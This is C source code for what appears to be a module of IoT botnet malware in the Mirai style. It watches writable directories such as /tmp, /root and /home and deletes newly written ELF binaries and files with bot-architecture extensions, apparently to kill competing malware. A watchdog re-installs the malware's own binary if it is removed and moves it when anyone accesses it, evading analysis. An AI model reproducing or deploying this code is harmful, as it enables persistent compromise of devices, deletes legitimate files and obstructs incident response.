#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/inotify.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <signal.h>
#include <sys/stat.h>
#include <errno.h>

#include "headers/watcher.h"
#include "headers/persist.h"
#include "headers/lifecycle.h"

#define MODULE_TAG "watcher"
#include "headers/debug.h"

static pthread_t watcher_tid;
static int watcher_started = 0;
static pthread_mutex_t watcher_mutex = PTHREAD_MUTEX_INITIALIZER;
static int stop_pipe[2] = {-1, -1};

#define WATCHDOG_INTERVAL 60
static int binary_watch_wd = -1;

#define EVENT_SIZE (sizeof(struct inotify_event))
#define EVENT_BUF_LEN (1024 * (EVENT_SIZE + 16))

static const char *initial_paths[] = {
    "/data/local/tmp", "/tmp", "/var/tmp", "/var/run",
    "/mnt", "/root", "/home", "/dev/shm"
};
#define INITIAL_PATHS_COUNT (sizeof(initial_paths) / sizeof(initial_paths[0]))

static const char *blacklisted[] = {
    "/dev/null", "/dev/console", "/var/lib/docker"
};
#define BLACKLISTED_COUNT (sizeof(blacklisted) / sizeof(blacklisted[0]))

static const char *suspicious_extensions[] = {
    ".x86", ".x86_64", ".x64",
    ".arm", ".arm4", ".arm5", ".arm6", ".arm7",
    ".armv4", ".armv4l", ".armv5", ".armv5l",
    ".armv6", ".armv6l", ".armv7", ".armv7l",
    ".aarch64", ".arm64",
    ".mips", ".mipsel", ".mpsl",
    ".ppc", ".powerpc",
    ".sh4", ".spc",
    ".i486", ".i586", ".i686",
    ".m68k", ".sparc", ".arc",
    ".bot", ".elf",
    NULL
};

struct watcher {
    char *path;
    int wd;
};

static char **paths = NULL;
static int num_paths = 0;

static struct watcher **watchers = NULL;
static int num_watchers = 0;

static int inotify_fd = -1;
static char buffer[EVENT_BUF_LEN] __attribute__((aligned(__alignof__(struct inotify_event))));

static char own_exe_path[512] = {0};

char *my_strdup(const char *src) {
    size_t len = strlen(src) + 1;
    char *dup = malloc(len);
    if (dup != NULL) memcpy(dup, src, len);
    return dup;
}

static void cache_own_exe(void) {
    ssize_t len = readlink("/proc/self/exe", own_exe_path, sizeof(own_exe_path) - 1);
    if (len > 0) {
        own_exe_path[len] = '\0';
        char *del = strstr(own_exe_path, " (deleted)");
        if (del) *del = '\0';
        DEBUG_PRINT("Own exe path: %s", own_exe_path);
    }
}

static int is_own_binary(const char *path) {
    if (own_exe_path[0] == '\0') return 0;
    return strcmp(path, own_exe_path) == 0;
}

static int is_elf_binary(const char *path) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;

    unsigned char magic[4] = {0};
    ssize_t n = read(fd, magic, 4);
    close(fd);

    if (n < 4) return 0;

    return (magic[0] == 0x7f &&
            magic[1] == 'E'  &&
            magic[2] == 'L'  &&
            magic[3] == 'F');
}

static int has_suspicious_extension(const char *filename) {
    if (!filename) return 0;

    const char *dot = strrchr(filename, '.');
    if (!dot) return 0;

    for (int i = 0; suspicious_extensions[i] != NULL; i++) {
        if (strcasecmp(dot, suspicious_extensions[i]) == 0) {
            return 1;
        }
    }
    return 0;
}

static int is_suspicious_file(const char *fullpath, const char *filename) {
    if (has_suspicious_extension(filename)) {
        DEBUG_PRINT("Suspicious extension: %s", filename);
        return 1;
    }

    if (is_elf_binary(fullpath)) {
        DEBUG_PRINT("ELF binary detected: %s", fullpath);
        return 1;
    }

    return 0;
}

static void free_paths_unlocked(void) {
    for (int i = 0; i < num_paths; ++i)
        free(paths[i]);
    free(paths);
    paths = NULL;
    num_paths = 0;
}

void free_paths(void) {
    pthread_mutex_lock(&watcher_mutex);
    free_paths_unlocked();
    pthread_mutex_unlock(&watcher_mutex);
}

static void free_watchers_unlocked(void) {
    for (int i = 0; i < num_watchers; i++) {
        if (inotify_fd >= 0) {
            inotify_rm_watch(inotify_fd, watchers[i]->wd);
        }
        free(watchers[i]->path);
        free(watchers[i]);
    }
    free(watchers);
    watchers = NULL;
    num_watchers = 0;
}

void free_watchers(void) {
    pthread_mutex_lock(&watcher_mutex);
    free_watchers_unlocked();
    pthread_mutex_unlock(&watcher_mutex);
}

#define MAX_RECURSE_DEPTH 4

void find_writable_dirs_recursive_depth(const char *dir, int depth) {
    if (depth > MAX_RECURSE_DEPTH) return;

    DIR *dp = opendir(dir);
    if (!dp)
        return;

    if (access(dir, W_OK) == 0) {
        char **temp = realloc(paths, (num_paths + 1) * sizeof(char *));
        if (!temp) {
            closedir(dp);
            return;
        }
        paths = temp;

        paths[num_paths] = my_strdup(dir);
        if (!paths[num_paths]) {
            closedir(dp);
            return;
        }
        num_paths++;
    }

    struct dirent *entry;
    while ((entry = readdir(dp))) {
        if (entry->d_name[0] == '.') continue;
        int is_dir = (entry->d_type == DT_DIR);
        if (!is_dir && entry->d_type == DT_UNKNOWN) {
            char p[1024];
            struct stat st;
            snprintf(p, sizeof(p), "%s/%s", dir, entry->d_name);
            if (stat(p, &st) == 0 && S_ISDIR(st.st_mode))
                is_dir = 1;
        }
        if (is_dir) {
            char p[1024];
            snprintf(p, sizeof(p), "%s/%s", dir, entry->d_name);
            find_writable_dirs_recursive_depth(p, depth + 1);
        }
    }

    closedir(dp);
}

void find_writable_dirs_recursive(const char *dir) {
    find_writable_dirs_recursive_depth(dir, 0);
}

void find_writable_dirs_initial(void) {
    for (size_t i = 0; i < INITIAL_PATHS_COUNT; i++) {
        find_writable_dirs_recursive(initial_paths[i]);
    }
}

void initialize_inotify(void) {
    inotify_fd = inotify_init();
    if (inotify_fd < 0) {
        return;
    }
}

void add_watcher(const char *path) {
    struct watcher *watch = malloc(sizeof(struct watcher));
    if (!watch)
        return;

    watch->path = my_strdup(path);
    if (!watch->path) {
        free(watch);
        return;
    }

    watch->wd = inotify_add_watch(inotify_fd, watch->path, IN_CREATE | IN_MODIFY | IN_MOVED_TO);
    if (watch->wd == -1) {
        free(watch->path);
        free(watch);
        return;
    }

    struct watcher **tmp = realloc(watchers, (num_watchers + 1) * sizeof(struct watcher *));
    if (!tmp) {
        free(watch->path);
        free(watch);
        return;
    }

    watchers = tmp;
    watchers[num_watchers] = watch;
    num_watchers++;
}

void handle_inotify_event(struct inotify_event *event) {
    for (int j = 0; j < num_watchers; j++) {
        if (event->wd != watchers[j]->wd)
            continue;

        if (!event->name || event->name[0] == '\0')
            return;

        char name[FILENAME_MAX] = "";
        snprintf(name, sizeof(name), "%s/%s", watchers[j]->path, event->name);

        if (event->mask & IN_ISDIR) {
            if ((event->mask & IN_CREATE) || (event->mask & IN_MOVED_TO)) {
                DEBUG_PRINT("New directory added to watcher: %s", name);
                add_watcher(name);
            }
            return;
        }

        for (size_t h = 0; h < BLACKLISTED_COUNT; h++) {
            if (strcmp(name, blacklisted[h]) == 0) {
                return;
            }
        }

        if (is_own_binary(name)) {
            return;
        }

        if (is_suspicious_file(name, event->name)) {
            DEBUG_PRINT("Removing suspicious file: %s", name);
            remove(name);
        }

        return;
    }
}

static void setup_binary_watch(void) {
    if (inotify_fd < 0) return;
    const char *bp = persist_get_binary_path();
    if (!bp) return;

    if (binary_watch_wd >= 0) {
        inotify_rm_watch(inotify_fd, binary_watch_wd);
        binary_watch_wd = -1;
    }

    binary_watch_wd = inotify_add_watch(inotify_fd, bp, IN_ACCESS);
    if (binary_watch_wd >= 0) {
        DEBUG_PRINT("Watching binary for access: %s", bp);
    }
}

static void watchdog_check_persistence(void) {
    const char *bp = persist_get_binary_path();

    if (!bp || access(bp, F_OK) != 0) {
        DEBUG_PRINT("Watchdog: binary missing, re-installing");
        persist_install();
        setup_binary_watch();
        return;
    }
}

void handle_inotify_events(void) {
    if (inotify_fd < 0) return;
    
    time_t last_watchdog = time(NULL);
    setup_binary_watch();
    
    while (running) {
        
        fd_set rfds;
        struct timeval tv;
        FD_ZERO(&rfds);
        FD_SET(inotify_fd, &rfds);
        if (stop_pipe[0] >= 0) FD_SET(stop_pipe[0], &rfds);
        int max_fd = inotify_fd > stop_pipe[0] ? inotify_fd : stop_pipe[0];
        
        tv.tv_sec = 5;
        tv.tv_usec = 0;
        
        int ret = select(max_fd + 1, &rfds, NULL, NULL, &tv);
        
        time_t now = time(NULL);
        if (now - last_watchdog >= WATCHDOG_INTERVAL) {
            watchdog_check_persistence();
            last_watchdog = now;
        }
        
        if (ret <= 0) continue;
        
        if (stop_pipe[0] >= 0 && FD_ISSET(stop_pipe[0], &rfds)) {
            break;
        }
        if (!FD_ISSET(inotify_fd, &rfds)) continue;

        int len;
        do {
            len = read(inotify_fd, buffer, EVENT_BUF_LEN);
        } while (len < 0 && errno == EINTR);
        if (len < 0)
            return;

        int i = 0;
        while (i < len) {
            struct inotify_event *event = (struct inotify_event *)&buffer[i];
            
            if (event->wd == binary_watch_wd && (event->mask & IN_ACCESS)) {
                DEBUG_PRINT("Watchdog: binary accessed! Rotating immediately");
                persist_rotate_binary();
                setup_binary_watch();
            } else {
                handle_inotify_event(event);
            }
            
            i += EVENT_SIZE + event->len;
        }
    }
}

void *watcher_task(void *arg) {
    cache_own_exe();
    find_writable_dirs_initial();
    initialize_inotify();

    for (int i = 0; i < num_paths; ++i)
        add_watcher(paths[i]);

    DEBUG_PRINT("Watcher started, monitoring %d paths", num_paths);
    handle_inotify_events();
    return NULL;
}

int start_watcher(void) {
    if (pipe(stop_pipe) == 0) {
        fcntl(stop_pipe[0], F_SETFL, O_NONBLOCK);
        fcntl(stop_pipe[1], F_SETFL, O_NONBLOCK);
    } else {
        stop_pipe[0] = -1;
        stop_pipe[1] = -1;
    }
    if (pthread_create(&watcher_tid, NULL, watcher_task, NULL) != 0) {
        if (stop_pipe[0] >= 0) { close(stop_pipe[0]); close(stop_pipe[1]); stop_pipe[0] = -1; stop_pipe[1] = -1; }
        return -1;
    }
    watcher_started = 1;
    return 0;
}

void stop_watcher(void) {
    if (!watcher_started) return;
    
    if (stop_pipe[1] >= 0) {
        char c = 1;
        write(stop_pipe[1], &c, 1);
    }
    
    pthread_join(watcher_tid, NULL);
    
    if (stop_pipe[0] >= 0) {
        close(stop_pipe[0]);
        close(stop_pipe[1]);
        stop_pipe[0] = -1;
        stop_pipe[1] = -1;
    }
    if (inotify_fd >= 0) {
        close(inotify_fd);
        inotify_fd = -1;
    }
    
    free_watchers();
    free_paths();
    
    watcher_started = 0;
}
